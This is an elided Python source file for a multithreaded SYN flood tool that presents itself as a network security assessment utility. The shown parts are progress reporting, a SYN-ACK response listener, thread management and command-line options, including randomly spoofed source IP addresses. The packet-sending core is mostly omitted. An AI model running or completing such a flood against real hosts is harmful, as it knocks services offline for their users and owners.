    ...
    try:
        while True:
            ...
            if spoof_ip:
                ...
                source_ip = None  # Let scapy use the real IP
        ...
        while True:
            ...
            with counter_lock:
                ...
                if response_counter is not None:
                    current_response_count = response_counter[0]
            ...
            if elapsed > 0:
                ...
                if response_counter is not None:
                    ...
                    response_rate = 0
                    if current_count > 0:
                        response_rate = (current_response_count / current_count) * 100
                    response_info = f" - Responses: {current_response_count} ({response_rate:.2f}%, +{responses_since_last})"

                # Print progress
                if total_packets > 0:
                    percentage = (current_count / total_packets) * 100
                    print(f"[+] Progress: {current_count}/{total_packets} packets ({percentage:.1f}%) - Rate: {packet_rate:.2f} p/s (Current: {packets_since_last}/s){response_info}")
                else:
                    print(f"[+] Sent {current_count} packets - Rate: {packet_rate:.2f} p/s (Current: {packets_since_last}/s){response_info}")
...
def syn_ack_listener(target_ip, target_port, response_counter, listen_flag):
    """
    Listen for SYN-ACK responses from the target.

    Args:
        target_ip: Target host IP to listen for responses from
        target_port: Target TCP port to listen for responses from
        response_counter: Counter to track responses
        listen_flag: Flag to control when to stop listening
    """
    def packet_callback(packet):
        # Check if the packet is a TCP packet with SYN-ACK flags (0x12)
...
def syn_flood(target_ip, target_port, packet_count, delay, num_threads, spoof_ip, listen_flag):
    ...
    Args:
        ...
        listen_flag: Whether to listen for SYN-ACK responses
    """
    try:
        ...
        if spoof_ip:
            print("[*] Using randomly spoofed source IP addresses")
        else:
        ...
        counter = [0]
        response_counter = [0]
        listen_control = [True]  # Flag to control listener thread
        ...
        if listen_flag:
            monitor_thread = threading.Thread(target=progress_monitor,
                                            args=(counter, packet_count, response_counter),
                                            daemon=True)
        else:
            monitor_thread = threading.Thread(target=progress_monitor,
        ...
        if listen_flag:
            listener_thread = threading.Thread(target=syn_ack_listener,
        ...
        if listen_flag:
            ...
            time.sleep(2)  # Give time for final responses
...
def main():
    parser = argparse.ArgumentParser(description="Multithreaded SYN Flood Testing Tool for Network Security Assessment")
    ...
    parser.add_argument("-s", "--spoof", action="store_true", help="Use randomly spoofed source IP addresses")
    parser.add_argument("-l", "--listen", action="store_true", help="Listen for SYN-ACK responses")
    ...
    syn_flood(args.target, args.port, args.count, args.delay, args.threads, args.spoof, args.listen)
